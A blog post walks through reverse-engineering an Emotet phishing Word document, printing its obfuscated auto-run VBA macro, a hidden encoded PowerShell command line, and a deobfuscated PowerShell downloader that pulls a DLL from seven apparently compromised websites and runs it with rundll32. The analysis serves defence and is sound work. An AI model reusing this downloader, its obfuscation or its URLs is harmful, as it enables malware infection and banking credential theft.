---
layout: post
title: "Reverse Engineering the Emotet E-Mail Virus"
description: "First part of the reverse-engineering process I went through to find out what the Emotet virus was doing behind all its obfuscation"
date: 2021-01-01
categories: computer-science
tags: emotet emotet-trojan emotet-virus emotet-reverse-engineering reverse-engineering
image: "/assets/posts/emotet-cover.png"
---

Recently, a friend of mine received on an institutional mailbox a message from a colleague which contained weird text and a suspicious attachment. Unfortunately, given that the mail brought the name of this close colleague and even referenced legit information from previous messages they had exchanged, she downloaded the ZIP file and opened the MS Word document it contained (the mail stated it would be about important access information for a laboratory).

Immediately, a terminal briefly popped up and vanished, triggering the anti-virus software. She quickly contacted me and another friend to know what to do to be completely safe, so we started exploring and reverse-engineering the contents of the attachment.

The attachment was an encrypted ZIP archive with the password mentioned in the email message. The purpose of encryption is to stop anti-spam filters from reading the contents of the attachment and detecting the malicious code inside, so that the mail can reach its recipients with no warnings whatsoever about its safety. Decompressing the archive revealed a MS Word DOC file which definitely didn’t look like something legit.

Analyzing the document with [oletools](http://decalage.info/python/oletools) further confirmed the suspicion:

```shell
$ olevba -a '15140-30-122020-5-42286.doc'
olevba 0.56 on Python 3.8.6 - http://decalage.info/python/oletools
=====================================================================================
FILE: 15140-30-122020-5-42286.doc
Type: OLE
ERROR    invalid value for PROJECTDOCSTRING_Id expected 0005 got 0032
-------------------------------------------------------------------------------------
VBA MACRO T77vhvocooru69svd.cls
in file: 15140-30-122020-5-42286.doc - OLE stream: 'Macros/VBA/T77vhvocooru69svd'
-------------------------------------------------------------------------------------
VBA MACRO Ixk24i1ovj_jjd.bas
in file: 15140-30-122020-5-42286.doc - OLE stream: 'Macros/VBA/Ixk24i1ovj_jjd'
-------------------------------------------------------------------------------------
VBA MACRO Zm6erye0ms_u.bas
in file: 15140-30-122020-5-42286.doc - OLE stream: 'Macros/VBA/Zm6erye0ms_u'
+----------+--------------------+---------------------------------------------------+
|Type      |Keyword             |Description                                        |
+----------+--------------------+---------------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is opened |
|Suspicious|CreateTextFile      |May create a text file                             |
|Suspicious|Create              |May execute file or a system command through WMI   |
|Suspicious|CreateObject        |May create an OLE object                           |
+----------+--------------------+---------------------------------------------------+
```

The document appears to contain **VBA macros** set to automatically execute upon opening. Using the same set of tools, we could extract the three detected macros (of which only the last one contained interesting code).

```shell
$ olevba -c '15140-30-122020-5-42286.doc'
olevba 0.56 on Python 3.8.6 - http://decalage.info/python/oletools
===============================================================================
FILE: /home/alex/ethical_hacking/email_viruses/15140-30-122020-5-42286/15140-30-122020-5-42286.doc
Type: OLE
ERROR    invalid value for PROJECTDOCSTRING_Id expected 0005 got 0032
-------------------------------------------------------------------------------
VBA MACRO T77vhvocooru69svd.cls
in file: /home/alex/ethical_hacking/email_viruses/15140-30-122020-5-42286/15140-30-122020-5-42286.doc - OLE stream: 'Macros/VBA/T77vhvocooru69svd'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_open()
R56_jx62hkjlsm
End Sub
-------------------------------------------------------------------------------
VBA MACRO Ixk24i1ovj_jjd.bas
in file: /home/alex/ethical_hacking/email_viruses/15140-30-122020-5-42286/15140-30-122020-5-42286.doc - OLE stream: 'Macros/VBA/Ixk24i1ovj_jjd'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Zm6erye0ms_u.bas
in file: /home/alex/ethical_hacking/email_viruses/15140-30-122020-5-42286/15140-30-122020-5-42286.doc - OLE stream: 'Macros/VBA/Zm6erye0ms_u'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Function R56_jx62hkjlsm()
On Error Resume Next
mKbjhqs = T77vhvocooru69svd.StoryRanges.Item(4 / 4)
   GoTo GfsQIDHId
Dim CrIUuEVIH As Object
Set CrIUuEVIH = CreateObject("Scripting.FileSystemObject")
Dim GfsQIDHId As Object
Set GfsQIDHId = CrIUuEVIH.CreateTextFile("K:\ognWFHGLH\axqgNAI.kcbGHdI")
GfsQIDHId.WriteLine " "
GfsQIDHId.Close
[...]
```

The VBA code was obviously obfuscated, but with a bit of elbow oil, we managed to manually replace all variable names to intelligible words and obtain some comprehensible code. On the “relabelled” script, it appeared that the most part of the code was just a “filler”, constantly jumped over by GOTOs. Therefore, I removed all the unneeded blocks and only left the used instructions, which appeared to be constructing a long string to be decoded.

Original VBA code:

```vb
Attribute VB_Name = "Zm6erye0ms_u"
Function R56_jx62hkjlsm()
On Error Resume Next
mKbjhqs = T77vhvocooru69svd.StoryRanges.Item(4 / 4)
   GoTo GfsQIDHId
Dim CrIUuEVIH As Object
Set CrIUuEVIH = CreateObject("Scripting.FileSystemObject")
Dim GfsQIDHId As Object
Set GfsQIDHId = CrIUuEVIH.CreateTextFile("K:\ognWFHGLH\axqgNAI.kcbGHdI")
GfsQIDHId.WriteLine " "
GfsQIDHId.Close
Set CrIUuEVIH = Nothing
Set GfsQIDHId = Nothing
GfsQIDHId:
snahbsd = "]e1r[Sp]e1r[S"
Gj76l2x9aiipmlo = "]e1r[Sro]e1r[S]e1r[Sce]e1r[Ss]e1r[Ss]e1r[S]e1r[S"
   GoTo jrMbHDQr
Dim PJYlEEF As Object
Set PJYlEEF = CreateObject("Scripting.FileSystemObject")
Dim jrMbHDQr As Object
Set jrMbHDQr = PJYlEEF.CreateTextFile("K:\oOLBGHFK\nSNqy.gEYwBNWo")
jrMbHDQr.WriteLine " "
jrMbHDQr.Close
Set PJYlEEF = Nothing
Set jrMbHDQr = Nothing
jrMbHDQr:
Tdi3xyxcbrj_h = "]e1r[S:w]e1r[S]e1r[Sin]e1r[S3]e1r[S2]e1r[S_]e1r[S"
   GoTo CBLCF
Dim oszQNEreI As Object
Set oszQNEreI = CreateObject("Scripting.FileSystemObject")

' Goes on like this for quite a bit...
```
“Relabelled” VBA code:

```vb
Attribute VB_Name = "Zm6erye0ms_u"

Function FUNC_1()
    On Error Resume Next
    VAR_1 = T77vhvocooru69svd.StoryRanges.Item(4 / 4)
       GoTo FILE_1

    Dim FS_OBJ_1 As Object
    Set FS_OBJ_1 = CreateObject("Scripting.FileSystemObject")
    Dim FILE_1 As Object
    Set FILE_1 = FS_OBJ_1.CreateTextFile("K:\ognWFHGLH\axqgNAI.kcbGHdI")
    FILE_1.WriteLine " "
    FILE_1.Close
    Set FS_OBJ_1 = Nothing
    Set FILE_1 = Nothing

    FILE_1:
    STRING_2 = "]e1r[Sp]e1r[S"
    STRING_1 = "]e1r[Sro]e1r[S]e1r[Sce]e1r[Ss]e1r[Ss]e1r[S]e1r[S"
       GoTo FILE_2

    Dim FS_OBJ_2 As Object
    Set FS_OBJ_2 = CreateObject("Scripting.FileSystemObject")
    Dim FILE_2 As Object
    Set FILE_2 = FS_OBJ_2.CreateTextFile("K:\oOLBGHFK\nSNqy.gEYwBNWo")
    FILE_2.WriteLine " "
    FILE_2.Close
    Set FS_OBJ_2 = Nothing
    Set FILE_2 = Nothing

    FILE_2:
    STRING_3 = "]e1r[S:w]e1r[S]e1r[Sin]e1r[S3]e1r[S2]e1r[S_]e1r[S"
       GoTo FILE_3
'    [...]
    FILE_10:
End Function

Function FUNC_2(F2_PARAM_1)
    On Error Resume Next
       GoTo F2_FILE_1
'   [...]
    F2_FILE_4:
End Function

Function FUNC_3(F3_PARAM_1)
    X99gngssmzsqq = Whcl9h6l9d7m8
       GoTo F3_FILE_1
'   [...]
    F3_FILE_1:
    FUNC_3 = Replace(F3_PARAM_1, "]e1r[S", Kt0_vcn5tcw)
       GoTo F3_FILE_2

    Dim F3_FS_2 As Object
    Set F3_FS_2 = CreateObject("Scripting.FileSystemObject")
    Dim F3_FILE_2 As Object
    Set F3_FILE_2 = F3_FS_2.CreateTextFile("K:\GPxCKeLBF\oKHCHmpdJ.TlXQC")
    F3_FILE_2.WriteLine " "
    F3_FILE_2.Close
    Set F3_FS_2 = Nothing
    Set F3_FILE_2 = Nothing

    F3_FILE_2:
End Function
```

Relabelled and stripped VBA code:

```vb
Attribute VB_Name = "Zm6erye0ms_u"

Function FUNC_1()
    On Error Resume Next
    VAR_1 = T77vhvocooru69svd.StoryRanges.Item(4 / 4)
    STRING_2 = "]e1r[Sp]e1r[S"
    STRING_1 = "]e1r[Sro]e1r[S]e1r[Sce]e1r[Ss]e1r[Ss]e1r[S]e1r[S"
    STRING_3 = "]e1r[S:w]e1r[S]e1r[Sin]e1r[S3]e1r[S2]e1r[S_]e1r[S"
    STRING_4 = "w]e1r[Sin]e1r[Sm]e1r[Sgm]e1r[St]e1r[S]e1r[S"
    STRING_5 = "]e1r[S" + Mid(Application.Name, 6, 1) + "]e1r[S"
    STRING_6 = STRING_4 + STRING_5 + STRING_3 + STRING_2 + STRING_1
    STRING_7 = FUNC_2(STRING_6)
    Set Pk_5ig5b_s73znxc0 = CreateObject(STRING_7)
    STRING_8 = Mid(VAR_1, (15 / 3), Len(VAR_1))
    Pk_5ig5b_s73znxc0.Create FUNC_2(STRING_8), Voimejxb5291hk, Q3bxn77g1219
End Function

Function FUNC_2(F2_PARAM_1)
    On Error Resume Next
    F2_PARAM_2 = (F2_PARAM_1)
    F2_PARAM_3 = FUNC_3(F2_PARAM_2)
    FUNC_2 = F2_PARAM_3
End Function

Function FUNC_3(F3_PARAM_1)
    X99gngssmzsqq = Whcl9h6l9d7m8
    FUNC_3 = Replace(F3_PARAM_1, "]e1r[S", Kt0_vcn5tcw)
End Function
```

To compose the string, the script made also use of the contents of the original DOC file (grabbed with `T77vhvocooru69svd.StoryRanges.Item(4 / 4)` and stored in `VAR_1`). Extrapolating it and putting all the pieces together yielded this string:

```batch
cmd cmd cmd cmd /c msg %username% /v Word experienced an error trying to open the file. &amp;  P^Ow^er^she^L^L -w hidden -ENCOD                 IAAgAHMAZQB0AC0AdgBhAFIA[...]TAA9ACgAJwBEADkAJwArACcAXwBRACcAKQA=
```

This result is clearly an invocation to a hidden PowerShell with a base64-encoded string as argument. Decoding the argument with common base64 decoders didn’t work, so I had to use an online PowerShell REPL (at [tio.run](https://tio.run/)) and invoke the PowerShell decoder.

![Decoding if the Base-64 PowerShell string](/assets/posts/emotet-1.png){:.img-big}

Once again, the code had been obfuscated, so with a bit of effort we manually reconstructed the script.

```powershell
set-vaRIabLe 8ye ([tYpE]("sYstEM.IO.dIREcTOrY"));
Sv ("plt") ([Type]("system.nET.seRVIcEpoiNtmanaGEr"));
$ErrorActionPreference = ('SilentlyContinue');

(gET-vARiAblE 8YE).valUe::"cReATeDIrEcToRy"($HOME + ('\Jxk4jr_\Dhuljgz\'));
(VaRiablE ("PLt")).vAlUE::"SecUritYPrOTocOl" = ('Tls12');

$DLL_PATH=$HOME+('\Jxk4jr_\Dhuljgz\D71J.dll');
$URLS=(
    'http://swiftlogisticseg.com/wp-admin/VE9h0jj/',
    'http://sahla-ad.com/wp-content/a/',
    'http://myphamjapan.com/dup-installer/db/',
    'https://bandarabbad.com/wp-admin/Lo5kEa/',
    'http://ngrehab.biz/wp-includes/TCWeeN/',
    'https://www.bereketsutesisatcisi.com/wp-content/xhGs43c/',
    'https://astrologiaexistencial.com/l/L/'
);

foreach ($WEBISTE in $URLS){
    try{
        (.('New-Object') SyStem.NeT.WeBClient)."DoWNloADfIle"($WEBISTE, $DLL_PATH);
        If ((&('Get-Item') $DLL_PATH)."LeNGTH" -ge 37992) {
            &('rundll32') $DLL_PATH,('Control_RunDLL')."tOstRING"();
            break;
        }
    } catch {
    }
}
```

Once more, this is not yet the actual virus. This script appears instead to be the downloader of the malware: it contains a list of (probably compromised) websites where the malicious DLL resides, and for each of these URLs it tries to pull the virus.

Unfortunately, by the time we got at this point, all the listed websites had been already taken down, so we could not fetch the DLL. However, with a bit of research we found out that this virus was quite a well known trojan called [Emotet](https://en.wikipedia.org/wiki/Emotet). This virus, also known as *Geodo* or *Mealybug*, is a Russian malware that’s been active since 2014, and mainly propagates through emails in form of encrypted ZIP files (to bypass security checks) with MS Office documents inside. Related articles on the web state that its purpose is to locate and steal banking accounts related files on the victim’s PC, so the least to do is to immediately update all related passwords, possibly using another machine known to be genuine.

Additional technical information on how Emotet operates can be found at [https://us-cert.cisa.gov/ncas/alerts/aa20-280a](https://us-cert.cisa.gov/ncas/alerts/aa20-280a).
